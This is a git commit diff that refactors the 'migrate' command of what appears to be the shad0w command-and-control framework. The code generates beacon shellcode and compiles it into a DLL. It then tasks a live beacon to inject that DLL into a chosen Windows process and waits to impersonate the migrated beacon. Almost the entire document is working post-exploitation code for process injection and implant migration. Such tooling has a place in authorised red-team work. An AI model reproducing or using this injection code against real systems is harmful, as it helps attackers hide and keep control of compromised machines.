f754cc7d237e52a5cf0fd27bf0630c9182f06270
HashtagMarkus <markus.hoefer@codecentric.de>
2020-09-24 06:46:32 -0400

    Refactor migrate command

--- lib/commands/migrate.py
+++ lib/commands/migrate.py
@@ -14,33 +14,19 @@ __description__ = "Migrate the beacon to a different process"
 __author__ = "@_batsec_"
 
 # identify the task as shellcode execute
+from lib.basecommand import BaseCommand
+
 DLLINJECT_EXEC_ID = 0x5000
 
-# did the command error
-ERROR = False
-error_list = ""
-
-# let argparse error and exit nice
-def error(message):
-    global ERROR, error_list
-    ERROR = True
-    error_list += f"\033[0;31m{message}\033[0m\n"
-
-def exit(status=0, message=None):
-    if message != None: print(message)
-    return
 
 def build_inject_info(args, rcode):
-
     # create the json object to tell the beacon
     # where to execute the code.
 
-    info = {}
-
-    info["pid"] = int(args.pid)
-    info["dll"] = rcode
+    info = {"pid": int(args.pid), "dll": rcode}
 
     return json.dumps(info)
+
 
 def generate_beacon_code(shad0w):
     buildtools.clone_source_files(rootdir='injectable')
@@ -62,6 +48,7 @@ def generate_beacon_code(shad0w):
 
     return buildtools.extract_shellcode()
 
+
 def format_shellcode(shellcode):
     hshellcode = ""
 
@@ -74,6 +61,7 @@ def format_shellcode(shellcode):
             hshellcode += f"{hex(byte)}"
 
     return hshellcode
+
 
 def write_header(code, file_loc):
     hex_code = format_shellcode(code)
@@ -89,27 +77,32 @@ unsigned int beacon_bin_len = %s;
 
     return
 
+
 def get_dll_data(file_loc):
     with open(file_loc, "rb") as file:
         data = file.read()
 
     return base64.b64encode(data).decode()
 
+
 def generate_beacon_dll(shad0w, rcode):
     # write header file
     write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")
 
     # build the dll
-    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/", basedir="/root/shad0w/modules/windows/shinject/")
-    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll", builddir=os.getcwd(), make_target="x64")
+    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/",
+                                  basedir="/root/shad0w/modules/windows/shinject/")
+    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll",
+                                    builddir=os.getcwd(), make_target="x64")
 
     # check that the dll has built
-    if made != True:
+    if not made:
         shad0w.debug.error("Error building migrate dll")
         return
 
     # return the base64 dll data
     return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")
+
 
 def await_impersonate(shad0w, pid):
     while True:
@@ -127,58 +120,47 @@ def await_impersonate(shad0w, pid):
     shad0w.debug.good(f"Successfully migrated ({pid})")
     return
 
-def main(shad0w, args):
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+class MigrateCommand(BaseCommand):
+    def __init__(self, args):
+        BaseCommand.__init__(self, "migrate", args)
 
-    # usage examples
-    usage_examples = """
+    def parse_parameters(self):
+        self.parser.add_argument("-p", "--pid", required=True, help="PID to migrate to")
+
+    def get_usage(self):
+        return """
 
 Examples:
 
 migrate -p 8725
 """
 
-    # init argparse
-    parse = argparse.ArgumentParser(prog='migrate',
-                                    formatter_class=argparse.RawDescriptionHelpFormatter,
-                                    epilog=usage_examples)
+    def run(self, shad0w):
+        # create the beacon
+        rcode = generate_beacon_code(shad0w)
 
-    # keep it behaving nice
-    parse.exit = exit
-    parse.error = error
+        # create the beacon dll
+        rcode = generate_beacon_dll(shad0w, rcode)
 
-    # set the args
-    parse.add_argument("-p", "--pid", required=True, help="PID to migrate to")
+        # make the json info
+        inject_info = build_inject_info(self.args, rcode)
 
-    # make sure we dont die from weird args
-    try:
-        args = parse.parse_args(args[1:])
-    except:
-        pass
+        # tell the beacon to execute the dll
+        shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
 
-    # show the errors to the user
-    if ERROR:
-        print(error_list)
-        parse.print_help()
+        # try to impersonate the new beacon
+        threading.Thread(target=await_impersonate, args=(shad0w, self.args.pid)).start()
+
+
+def main(shad0w, args):
+    # check we actually have a beacon
+    if shad0w.current_beacon is None:
+        shad0w.debug.log("ERROR: No active beacon", log=True)
         return
 
-    # create the beacon
-    rcode = generate_beacon_code(shad0w)
-
-    # create the beacon dll
-    rcode = generate_beacon_dll(shad0w, rcode)
-
-    # make the json info
-    inject_info = build_inject_info(args, rcode)
-
-    # tell the beacon to execute the dll
-    shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
-
-    # try to impersonate the new beacon
-    threading.Thread(target=await_impersonate, args=(shad0w, args.pid)).start()
+    cmd = MigrateCommand(args)
+    if cmd.parse():
+        cmd.run(shad0w)
 
     return
